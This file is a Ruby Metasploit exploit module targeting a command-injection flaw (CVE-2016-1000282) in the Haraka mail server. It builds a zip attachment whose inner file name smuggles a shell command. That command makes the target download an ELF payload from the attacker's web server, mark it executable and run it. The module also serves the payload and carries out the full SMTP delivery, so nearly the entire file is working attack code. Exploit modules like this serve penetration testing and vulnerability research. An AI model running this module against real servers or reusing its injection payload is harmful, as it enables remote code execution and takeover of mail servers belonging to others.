#this code is based on:
# https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/linux/smtp/exim4_dovecot_exec.rb

require 'msf/core'
require 'base64'
require 'zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Smtp
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Haraka Command Injection (used for Linux Payload download)',
      'Description'    => %q{
        This module exploits a command injection vulnerability in Haraka < 2.8.9 with
        attachment plugin enabled and working.
      },
      'Author'         =>
        [
          'xychix / Mark, Outflank' # Exploit-DB python exploit and msf module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2016-1000282'],
          [ 'URL', 'https://github.com/outflankbv/Exploits/blob/master/harakiri-CVE-2016-1000282.py'],
          [ 'URL', 'https://www.exploit-db.com/exploits/41162/'],
          [ 'URL', 'https://github.com/distributedweaknessfiling/DWF-Database-Artifacts/blob/158c10cf11bc7d6ad728c1a8dd213f523ecfca52/DWF/2016/1000282/CVE-2016-1000282.json'],
          [ 'EDB', '41162']
        ],
      'Privileged'     => false,
      'Arch'           => ARCH_X86,
      'Platform'       => 'Linux',
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [ 'Linux x86', { }],
        ],
      'DisclosureDate' => 'Jan 25 2017',
      'DefaultTarget'  => 0))

      register_options(
      [
        OptString.new('EHLO', [ true, 'TO address of the e-mail', 'haraka.test']),
        OptString.new('MAILTO', [ true, 'TO address of the e-mail', 'root@haraka.test']),
        OptString.new('MAILFROM', [ true, 'FROM address of the e-mail', 'harakiri@exploit.db']),
        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),
        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),
        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60])
      ], self.class)

      register_advanced_options(
      [
        OptBool.new("SkipVersionCheck", [false, "Specify this to skip the version check", false])
      ], self.class)

  end


  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['HTTP_DELAY'])
        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it can't connect back to us?")
      end
    end
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  def exploit
    @pl = generate_payload_exe
    @elf_sent = false

    #
    # start our web server to deploy the final payload
    #
    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))
    resource_uri = '/' + downfile
    webport = datastore['SRVPORT']

    if (datastore['DOWNHOST'])
      service_url_payload = datastore['DOWNHOST'] + resource_uri
    else

      #do not use SSL
      if datastore['SSL']
        ssl_restore = true
        datastore['SSL'] = false
      end

      #we use SRVHOST as download IP for the coming wget command.
      if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
        srv_host = datastore['URIHOST'] || Rex::Socket.source_address(rhost)
      else
        srv_host = datastore['SRVHOST']
      end

      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
      service_url_payload = srv_host + resource_uri
      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({'Uri' => {
        'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        'Path' => resource_uri
      }})

      datastore['SSL'] = true if ssl_restore
    end

  cmd = "/usr/bin/wget #{service_url} -O /tmp/#{downfile};chmod 777 /tmp/#{downfile};/tmp/#{downfile}"
  print_status(cmd)
  connect


    print_status("#{rhost}:#{rport} - Server: #{self.banner.to_s.strip}")
    if not datastore['SkipVersionCheck'] and self.banner.to_s !~ /Haraka /
      disconnect
      fail_with(Failure::NoTarget, "#{rhost}:#{rport} - The target server is not running Haraka!")
    end
    #
    # Initiate the message
    from = datastore['MAILFROM']
    to   = datastore['MAILTO']
    ehlo = datastore['EHLO']

  ehlo_resp = raw_send_recv("EHLO #{ehlo}\r\n")
    ehlo_resp.each_line do |line|
      print_status("#{rhost}:#{rport} - EHLO: #{line.strip}")
    end

  resp = raw_send_recv("MAIL FROM: #{from}\r\n")
    resp ||= 'no response'
    msg = "MAIL: #{resp.strip}"
    if not resp or resp[0,3] != '250'
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end

    # connected lets start mailing
    resp = raw_send_recv("RCPT TO: #{to}\r\n")
    resp ||= 'no response'
    msg = "RCPT: #{resp.strip}"
    if not resp or resp[0,3] != '250'
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end

    resp = raw_send_recv("DATA\r\n")
    resp ||= 'no response'
    msg = "DATA: #{resp.strip}"
    if not resp or resp[0,3] != '354'
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end

  stringib = Zip::OutputStream.write_buffer do |zib|
      zib.put_next_entry("harakiri.txt")
      zib.write "Hello world!"
  end

  stringia = Zip::OutputStream.write_buffer do |zia|
      zia.put_next_entry("a\";#{cmd};echo \"a.zip")
      zia.write stringib.string
  end

    message  = "Content-Type: multipart/mixed; boundary='===============1434375302937503704=='\r\n"
    message <<  "MIME-Version: 1.0\r\n"
    message << "Subject: harakiri\r\n"
    message << "From: #{from}\r\n"
    message << "To: #{to}\r\n"
    message << "\r\n"
    message << "--===============1434375302937503704==\r\n"
    message << "Content-Type: text/plain; charset='us-ascii'\r\n"
    message << "MIME-Version: 1.0\r\n"
    message << "Content-Transfer-Encoding: 7bit\r\n"
    message << "\r\n"
    message << "harakiri\r\n"
    message << "--===============1434375302937503704==\r\n"
    message << "Content-Type: application/octet-stream; Name='harakiri.zip'\r\n"
    message << "MIME-Version: 1.0\r\n"
    message << "Content-Transfer-Encoding: base64\r\n"
    message << "Content-Disposition: attachment; filename='harakiri.zip'\r\n"
    message << "\r\n"
    message << Base64.encode64(stringia.string)
    message << "--===============1434375302937503704==--\r\n"
    message << ".\r\n"
    resp = raw_send_recv(message)
    #msg = "DELIVER: #{resp}"
    #if resp[0,3] == '450'
    #  print_status("SUCCES! #{rhost}:#{rport} - Failing to extract archive, if bsdtar was available command is run!")
    #else
    #  print_status("#{rhost}:#{rport} - #{msg}\n")
    #end
  resp = raw_send_recv("rset\r\n")
    disconnect

  end

end
